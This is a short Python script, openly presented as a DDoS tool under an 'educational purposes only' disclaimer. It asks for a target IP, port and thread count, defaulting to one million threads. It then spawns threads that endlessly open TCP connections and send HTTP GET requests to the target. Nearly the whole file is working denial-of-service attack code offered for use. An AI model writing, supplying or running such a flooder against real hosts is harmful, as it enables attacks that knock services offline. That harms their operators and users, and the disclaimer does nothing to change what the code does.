#ONLY FOR EDUCATIONAL PURPOSES. I AM NOT RESPONSIBLE FOR ANY ILLEGAL USE
import socket
import threading
def main(): 
    global target_ip
    global target_port
    global packet_size
    target_ip = input("YOUR TARGET_IP :\t")
    target_port = int(input("PORT:\t"))
    packet_size = int(input("ENTER THE PACKET SIZE WANTED:\t"))
    try :
        global num_threads
        num_threads = int(input("Enter the chosen number of threads:\t"))
    except Exception as error:
        print(f"WARNING : u had an error: {error} , we will take 1000000 as the number of threads by default !!")
        num_threads = 1000000
        

def ddos_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            sock.close()
        except Exception as error :
            print(f"ERROR!! {error}")
main()
threads = []
for i in range(num_threads):
    t = threading.Thread(target=ddos_attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
